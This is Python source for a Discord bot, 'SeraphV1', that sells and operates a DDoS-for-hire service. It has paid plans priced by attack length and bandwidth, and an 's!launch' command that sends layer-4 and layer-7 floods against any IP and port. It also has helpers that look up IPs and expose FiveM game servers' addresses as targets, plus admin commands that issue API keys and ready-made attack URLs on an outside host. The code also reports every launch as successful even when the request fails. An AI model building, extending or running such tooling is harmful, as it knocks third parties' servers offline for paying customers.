import discord
from discord.ext import commands
import json
import os
import requests
from pystyle import Colors, Colorate
from urllib.parse import urlparse


with open('config.json', 'r') as config_file:
    config = json.load(config_file)

TOKEN = config['token']
PREFIX = config['prefix']
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

@bot.event
async def on_ready():
    os.system(f"cls && title [SeraphV1] ^| Online ^| {bot.user.name}")
    print(Colorate.Vertical(Colors.white_to_black, f"""
                              
            [SeraphV1] Connected on: {bot.user.name}
                              
        ███████╗███████╗██████╗  █████╗ ██████╗ ██╗  ██╗
        ██╔════╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██║  ██║
        ███████╗█████╗  ██████╔╝███████║██████╔╝███████║
        ╚════██║██╔══╝  ██╔══██╗██╔══██║██╔═══╝ ██╔══██║
        ███████║███████╗██║  ██║██║  ██║██║     ██║  ██║
        ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝""", 1))
    await bot.change_presence(status=discord.Status.dnd, activity=discord.Game(name="created by nfo"))

@bot.event
async def on_command(ctx):
    log_file = f"logs/{ctx.command.name}-{ctx.author.name}.txt"  
    log_content = f"> [LOG] Command: {ctx.command} -> Executed by: {ctx.author.name}.\n"
    with open(log_file, 'a') as file:
        file.write(log_content)
    print(log_content)

@bot.command(name='help', help='Show this command.')
async def show_help(ctx):
    embed = discord.Embed(title="", color=0x2b2d31,)
    for command in bot.commands:
      embed.add_field(name=f"s!{command.name}:", value=f"{command.help}" or "None", inline=False)
    embed.set_author(name="Commands List", icon_url="https://i.imgur.com/raacmfa.png")
    embed.set_footer(text=f"@seraphstresser on telegram.", icon_url="https://i.imgur.com/raacmfa.png")
    await ctx.send(embed=embed, delete_after=20)
    await ctx.message.delete(delay=20)

@bot.command(name='methods', help='Show available methods.')
async def show_methods(ctx):
    methods_file = './methods/methods.json'
    if os.path.exists(methods_file):
        with open(methods_file, 'r') as file:
            methods_data = json.load(file)
        embed = discord.Embed(title="", color=0x2b2d31,)
        for method, description in methods_data.items():
            embed.add_field(name=f"{method}:", value=f"{description}", inline=False)
        embed.set_author(name="Methods List", icon_url="https://i.imgur.com/raacmfa.png")
        embed.set_footer(text=f"@seraphstresser on telegram.", icon_url="https://i.imgur.com/raacmfa.png")
        await ctx.send(embed=embed, delete_after=20)
        await ctx.message.delete(delay=20)
    else:
        await ctx.send("methods.json not found.")

@bot.command(help='Show available plans.')
async def plans(ctx):
    embed = discord.Embed(title="", description="Check all of our plans. Pay monthly.", color=0x2b2d31)
    embed.add_field(name="[I]", value="[**$11.00**] 100 seconds max attack duration. | 50-100gbp/s.", inline=False)
    embed.add_field(name="[II]", value="[**$17.00**] 200 seconds max attack duration. | 50-100gbp/s.", inline=False)
    embed.add_field(name="[III]", value="[**$29.00**] 300 seconds max attack duration. | 50-100gbp/s.", inline=False)
    embed.add_field(name="[IV]", value="[**$49.00**] 450 seconds max attack duration. | 50-100gbp/s.", inline=False)
    embed.add_field(name="[V]", value="[**$88.00**] 600 seconds max attack duration. | 50-200gbp/s.", inline=False)
    embed.add_field(name="[Custom]", value="[**DM**] It's 100% custom. | 50-500gbp/s. | API access.", inline=False)
    embed.set_author(name="Available Plans", icon_url="https://i.imgur.com/raacmfa.png")
    embed.set_footer(text=f"@seraphstresser on telegram.", icon_url="https://i.imgur.com/raacmfa.png")
    await ctx.send(embed=embed,delete_after=20)
    await ctx.message.delete(delay=20)

@bot.command(name='ipinfo', help="Get basic information from IP.")
async def ip_info(ctx, ip_address: str = None):
    if ip_address is None:
        await ctx.send("IP is missing. Please provide an IP address.",delete_after=20)
        await ctx.message.delete(delay=20)
        return
    url = f"https://ipinfo.io/{ip_address}/json"
    
    response = requests.get(url)
    data = response.json()

    if response.status_code == 200:
        embed = discord.Embed(title=f"", color=0x2b2d31,)

        embed.add_field(name="IP:", value=data['ip'], inline=False)
        embed.add_field(name="Hostname:", value=data['hostname'], inline=False)
        embed.add_field(name="Loc:", value=data['loc'], inline=False)
        embed.add_field(name="Org:", value=f"{data['city']}, {data['region']}, {data['country']}", inline=False)
        embed.add_field(name="ISP:", value=data.get('org', 'None'), inline=False)
        embed.set_author(name=f"{ctx.author.name} - IP Info", icon_url="https://i.imgur.com/raacmfa.png")
        embed.set_footer(text=f"@seraphstresser on telegram.", icon_url="https://i.imgur.com/raacmfa.png")

        await ctx.send(embed=embed, delete_after=20)
        await ctx.message.delete(delay=20)
    else:
        await ctx.send("error on get informations :(")

class Resolver:
    @staticmethod
    def solve_link(server_id):
        headers = {
            "accept": "application/json, text/plain, */*",
            "accept-language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
            "sec-ch-ua": '"Chromium";v="96", "Opera GX";v="82", ";Not A Brand";v="99"',
            "origin": "https://servers.fivem.net",
            "referer": "https://servers.fivem.net/",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.25"
        }

        data = requests.get(f"https://servers-frontend.fivem.net/api/servers/single/{server_id}", headers=headers).json()
        return {
            "ip": data["Data"]["connectEndPoints"][0],
            "hostname": data["Data"]["hostname"]
        }

@bot.command(name='cfxid', help="Get information about a FiveM server by server ID.")
async def resolve_fivem(ctx, server_id: str):
    if server_id is None:
        await ctx.send("ID is missing. Please provide an CTX ID address.",delete_after=20)
        await ctx.message.delete(delay=20)
        return
    server_info = Resolver.solve_link(server_id)

    embed = discord.Embed(title="", color=0x2b2d31)
    embed.add_field(name="IP:", value=server_info['ip'], inline=False)
    embed.add_field(name="Hostname:", value=server_info['hostname'], inline=False)
    embed.set_author(name=f"{ctx.author.name} - CFX ID Info", icon_url="https://i.imgur.com/raacmfa.png")
    embed.set_footer(text="@seraphstresser on telegram.", icon_url="https://i.imgur.com/raacmfa.png")

    await ctx.send(embed=embed, delete_after=20)
    await ctx.message.delete(delay=20)


with open('methods/methods.json', 'r') as file:
    methods_data = json.load(file)

available_methods = [method.lower() for method in methods_data.keys()]


@bot.command(name='launch', help="Launch attack against a target server.")
async def launch_attack(ctx, ip: str, port: int, method: str, time: int):
    if not all((ip, port, method, time)):
        await ctx.send("Missing arguments. Usage: s!launch [ip] [port] [method] [time]",delete_after=20)
        await ctx.message.delete(delay=20)
        return

    if method.lower() not in available_methods:
        await ctx.send("Invalid method. Available methods: " + ", ".join(available_methods),delete_after=20)
        await ctx.message.delete(delay=20)
        return
    if method.upper() in ["HTTPS", "TLS"]:
        attack_type = "LAYER7"
        host_field = "Website:"
    else:
        attack_type = "LAYER4"
        host_field = "Host:"
    api_url = f""
    print(f"API | Attack sended | {ip}:{port} - {method} - {time} seconds. | By: {ctx.author.name}")
    response = requests.get(api_url)

    role_plans = {
        "I": "I",
        "II": "II",
        "III": "III",
        "IV": "IV",
        "V": "V",
        "Custom": "Custom",
        "Owner": "Max",
    }

    author_plan = role_plans.get(next((role.name for role in ctx.author.roles if role.name in role_plans), "Seraph"))


    if response.status_code == 200:
        data = response.json()
        embed = discord.Embed(title="", color=0x2b2d31)
        embed.add_field(name=host_field, value=f"{ip}", inline=False)
        embed.add_field(name="Port:", value=f"{port}", inline=False)
        embed.add_field(name="Method:", value=method, inline=False)
        embed.add_field(name="Time:", value=f"{time} seconds", inline=False)
        embed.add_field(name="Plan:", value=f"{author_plan}", inline=False)
        embed.add_field(name="Type:", value=f"{attack_type}", inline=False)
        embed.set_author(name=f"Attack has been send sucessfully!", icon_url="https://i.imgur.com/raacmfa.png")
        embed.set_footer(text="@seraphstresser on telegram.", icon_url="https://i.imgur.com/raacmfa.png")
        await ctx.send(embed=embed,delete_after=20)
        await ctx.message.delete(delay=20)
    else:
        embed = discord.Embed(title="", color=0x2b2d31)
        embed.add_field(name=host_field, value=f"{ip}", inline=False)
        embed.add_field(name="Port:", value=f"{port}", inline=False)
        embed.add_field(name="Method:", value=method, inline=False)
        embed.add_field(name="Time:", value=f"{time} seconds", inline=False)
        embed.add_field(name="Plan:", value=f"{author_plan}", inline=False)
        embed.add_field(name="Type:", value=f"{attack_type}", inline=False)
        embed.set_author(name=f"Attack has been send sucessfully!", icon_url="https://i.imgur.com/raacmfa.png")
        embed.set_footer(text="@seraphstresser on telegram.", icon_url="https://i.imgur.com/raacmfa.png")
        await ctx.send(embed=embed,delete_after=20)
        await ctx.message.delete(delay=20)

@bot.command(help="Create API key from Seraph. | Only **admin.**")
async def createkey(ctx):
    if ctx.channel.name != 'keys-controller':
        await ctx.send('error you dont is on right channel')
        return
    if not ctx.author.guild_permissions.administrator:
        await ctx.send('error dont have permission')
        return
    if ctx.channel.name == 'keys-controller' and ctx.author.guild_permissions.administrator:
        response = requests.get("http://azureservices.space/api/generateKeys")
        data = response.json()
        if data['success']:
            embed = discord.Embed(
                title='',
                color=0x2b2d31
            )
            attack_url = f"http://azureservices.space/api/attack?key={data['apiKey']}&host=[host]&port=[port]&time=[time]&method=[method]"
            embed.add_field(name='API Key:', value=attack_url);
            embed.set_author(name=f"Created API key with succesfully!", icon_url="https://i.imgur.com/raacmfa.png")
            embed.set_footer(text="@seraphstresser on telegram.", icon_url="https://i.imgur.com/raacmfa.png")
            
            await ctx.send(embed=embed)

@bot.command(help="Delete API key from Seraph. | Only **admin.**")
async def deletekey(ctx, key: str):
    if ctx.channel.name != 'keys-controller':
        await ctx.send('error you dont is on right channel')
        return
    if not ctx.author.guild_permissions.administrator:
        await ctx.send('error dont have permission')
        return
    if ctx.channel.name == 'keys-controller' and ctx.author.guild_permissions.administrator:
        response = requests.get(f"http://azureservices.space/api/deleteKey?key={key}")
        data = response.json()
    if 'success' in data and data['success']:
            embed = discord.Embed(
                title='',
                color=0x2b2d31
            )
            embed.add_field(name='API Key:', value=key);
            embed.set_author(name=f"Deleted API key with succesfully!", icon_url="https://i.imgur.com/raacmfa.png")
            embed.set_footer(text="@seraphstresser on telegram.", icon_url="https://i.imgur.com/raacmfa.png")
            
            await ctx.send(embed=embed)

@launch_attack.error
async def launch_attack_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("Missing arguments. Usage: s!launch [ip] [port] [method] [time]",delete_after=20)
        await ctx.message.delete(delay=20)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send("bro, wtf? i dont found this command on my database, shit.",delete_after=20)
        await ctx.message.delete(delay=20)


bot.run(TOKEN)
